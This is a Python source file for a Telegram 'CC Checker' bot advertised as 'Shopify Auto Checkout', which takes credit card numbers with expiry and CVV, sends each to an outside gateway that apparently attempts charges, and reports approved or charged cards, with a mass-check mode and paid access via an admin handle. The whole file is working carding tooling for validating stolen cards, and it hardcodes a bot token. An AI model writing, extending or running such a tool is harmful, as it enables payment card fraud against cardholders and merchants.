import telebot
from flask import Flask
import re
import threading
import time
import json
import requests
import random
import sys
import logging
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ==================== CONFIGURATION ====================
BOT_TOKEN = "8228704791:AAH85VvWM1HK0-8EEiJKh533Gc3-ul5r-x8"
MAIN_ADMIN_ID = 5103348494
MAX_CARDS_PER_MCHK = 10
GATEWAY_URL = "https://chk-for-shopify.onrender.com"
# =======================================================

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler('bot.log')
    ]
)
logger = logging.getLogger(__name__)

# Initialize Flask app
app = Flask(__name__)

@app.route('/')
def health_check():
    return "🤖 CC Checker Bot is Operational", 200

@app.route('/ping')
def ping():
    return "pong", 200

class CcCheckerBot:
    def __init__(self):
        self.bot = telebot.TeleBot(BOT_TOKEN)
        self.load_data()
        self.register_handlers()
        
    def load_data(self):
        self.AUTHORIZED_USERS = self._load_json("authorized.json", {})
        self.ADMIN_IDS = self._load_json("admins.json", [MAIN_ADMIN_ID])
        
    def _load_json(self, filename, default):
        try:
            with open(filename, "r") as f:
                return json.load(f)
        except:
            return default
            
    def _save_json(self, filename, data):
        with open(filename, "w") as f:
            json.dump(data, f)

    # ================ HELPER FUNCTIONS ================
    def normalize_card(self, text):
        if not text:
            return None
        text = text.replace('\n', ' ').replace('/', ' ')
        numbers = re.findall(r'\d+', text)
        cc = mm = yy = cvv = ''
        for part in numbers:
            if len(part) == 16:
                cc = part
            elif len(part) == 4 and part.startswith('20'):
                yy = part
            elif len(part) == 2 and int(part) <= 12 and mm == '':
                mm = part
            elif len(part) == 2 and not part.startswith('20') and yy == '':
                yy = '20' + part
            elif len(part) in [3, 4] and cvv == '':
                cvv = part
        return f"{cc}|{mm}|{yy}|{cvv}" if cc and mm and yy and cvv else None

    def generate_user_agent(self):
        return random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0"
        ])

    def clean_response(self, text):
        return re.sub(r'<[^>]+>', '', text).strip()

    # ================ GATEWAY CALL ================
    def check_card(self, cc_line):
        try:
            url = f"{GATEWAY_URL}?lista={cc_line}"
            headers = {"User-Agent": self.generate_user_agent()}
            response = requests.get(url, headers=headers, timeout=20)
            return self.clean_response(response.text)
        except Exception as e:
            logger.error(f"Gateway error: {e}")
            return f"❌ Gateway Error: {str(e)}"

    # ================ COMMAND HANDLERS ================
    def register_handlers(self):
        @self.bot.message_handler(commands=['start'])
        def start_handler(msg):
            self.bot.reply_to(msg, "🌟 𝐒𝐡𝐨𝐩𝐢𝐟𝐲 𝐀𝐮𝐭𝐨 𝐂𝐡𝐞𝐜𝐤𝐨𝐮𝐭 𝐯𝟐!!\n\n"
                              "Use Commands as Follows\n"
                              "✞ /chk - Check single card\n"
                              "✞ /mchk - Mass check (reply to file)\n"
                              "💸 Contact Admin - @mhitzxg For Bot Access!!")

        @self.bot.message_handler(commands=['chk'])
        def chk_handler(msg):
            if not self.is_authorized(msg.from_user.id):
                return self.bot.reply_to(msg, "❌ Not authorized.")

            # Get CC details
            cc = None
            if msg.reply_to_message:
                cc = self.normalize_card(msg.reply_to_message.text or "")
            else:
                args = msg.text.split(None, 1)
                if len(args) > 1:
                    cc = self.normalize_card(args[1]) or args[1]

            if not cc:
                return self.bot.reply_to(msg, "❌ Invalid format. Use `/chk 4556737586899855|12|2026|123`", parse_mode='Markdown')

            # Animated processing
            processing = self.bot.reply_to(msg, "🔄 Starting Charge...")
            stop_event = threading.Event()
            
            def loading_animation():
                frames = ["🔍 Checking card... 💸", "🔍 Checking card... 🌟", 
                         "🔍 Checking card... 💳", "🔍 Checking card... ⚡"]
                i = 0
                while not stop_event.is_set():
                    try:
                        self.bot.edit_message_text(frames[i % len(frames)], 
                                                 msg.chat.id, 
                                                 processing.message_id)
                        time.sleep(0.5)
                        i += 1
                    except:
                        break

            threading.Thread(target=loading_animation).start()

            try:
                result = self.check_card(cc)
                stop_event.set()
                self.bot.edit_message_text(result, msg.chat.id, processing.message_id)
            except Exception as e:
                stop_event.set()
                self.bot.edit_message_text(f"❌ Error: {str(e)}", msg.chat.id, processing.message_id)

        @self.bot.message_handler(commands=['mchk'])
        def mchk_handler(msg):
            if not self.is_authorized(msg.from_user.id):
                return self.bot.reply_to(msg, "❌ Not authorized.")

            # Determine response location (group or private)
            response_chat = msg.chat.id if msg.chat.type in ['group', 'supergroup'] else msg.from_user.id

            if not msg.reply_to_message:
                return self.bot.send_message(response_chat, "❌ Reply to a message with CCs or a file.")

            # Extract text from message or file
            text = ""
            if msg.reply_to_message.document:
                try:
                    file_info = self.bot.get_file(msg.reply_to_message.document.file_id)
                    downloaded_file = self.bot.download_file(file_info.file_path)
                    text = downloaded_file.decode("utf-8", errors="ignore")
                except Exception as e:
                    return self.bot.send_message(response_chat, f"❌ File error: {str(e)}")
            else:
                text = msg.reply_to_message.text or ""

            # Process cards (limit to MAX_CARDS_PER_MCHK)
            cc_lines = []
            for line in text.splitlines()[:MAX_CARDS_PER_MCHK]:
                norm = self.normalize_card(line.strip())
                if norm:
                    cc_lines.append(norm)

            if not cc_lines:
                return self.bot.send_message(response_chat, "❌ No valid cards found.")

            if len(text.splitlines()) > MAX_CARDS_PER_MCHK:
                self.bot.send_message(response_chat, 
                                    f"⚠️ Only first {MAX_CARDS_PER_MCHK} cards will be processed")

            # Start mass check
            self.start_mass_check(response_chat, cc_lines)

    def start_mass_check(self, chat_id, cc_lines):
        total = len(cc_lines)
        approved = declined = checked = 0

        # Create status message with inline keyboard
        kb = InlineKeyboardMarkup()
        kb.add(InlineKeyboardButton("🔄 Refresh Status", callback_data="refresh_status"))
        status_msg = self.bot.send_message(
            chat_id,
            f"🔮 Mass Check Started\n\n"
            f"✅ Approved: 0\n"
            f"❌ Declined: 0\n"
            f"📊 Progress: 0/{total}",
            reply_markup=kb
        )

        def update_status():
            nonlocal approved, declined, checked
            self.bot.edit_message_text(
                f"🔮 Mass Check Progress\n\n"
                f"✅ Approved: {approved}\n"
                f"❌ Declined: {declined}\n"
                f"📊 Progress: {checked}/{total}",
                chat_id,
                status_msg.message_id,
                reply_markup=kb
            )

        def process_card(cc):
            nonlocal approved, declined, checked
            checked += 1
            result = self.check_card(cc)
            
            if any(x in result for x in ["CHARGED", "CVV MATCH", "APPROVED", "ORDER", "CVV"]):
                approved += 1
                self.bot.send_message(chat_id, f"💳 Card {checked}/{total}\n{result}")
            else:
                declined += 1
            
            update_status()
            time.sleep(1)  # Rate limiting

        # Process cards in threads
        for cc in cc_lines:
            threading.Thread(target=process_card, args=(cc,)).start()

    # ================ ADMIN FUNCTIONS ================
    def is_admin(self, user_id):
        return user_id in self.ADMIN_IDS
        
    def is_authorized(self, user_id):
        if self.is_admin(user_id):
            return True
        if str(user_id) in self.AUTHORIZED_USERS:
            expiry = self.AUTHORIZED_USERS[str(user_id)]
            if expiry == "forever" or time.time() < expiry:
                return True
            else:
                del self.AUTHORIZED_USERS[str(user_id)]
                self._save_json("authorized.json", self.AUTHORIZED_USERS)
        return False

    # ================ RUN BOT ================
    def run(self):
        logger.info("Starting bot...")
        self.bot.infinity_polling()

def run_flask():
    app.run(host='0.0.0.0', port=8080)

def main():
    try:
        # Start Flask in background
        flask_thread = threading.Thread(target=run_flask)
        flask_thread.daemon = True
        flask_thread.start()

        # Start bot with restart capability
        while True:
            try:
                bot = CcCheckerBot()
                bot.run()
            except Exception as e:
                logger.error(f"Bot crashed: {e}")
                time.sleep(5)
                logger.info("Restarting bot...")
            except KeyboardInterrupt:
                logger.info("Shutting down gracefully...")
                break

    except Exception as e:
        logger.critical(f"Fatal error: {e}")
        sys.exit(1)

if __name__ == '__main__':
    logger.info("🚀 Starting CC Checker Bot")
    main()


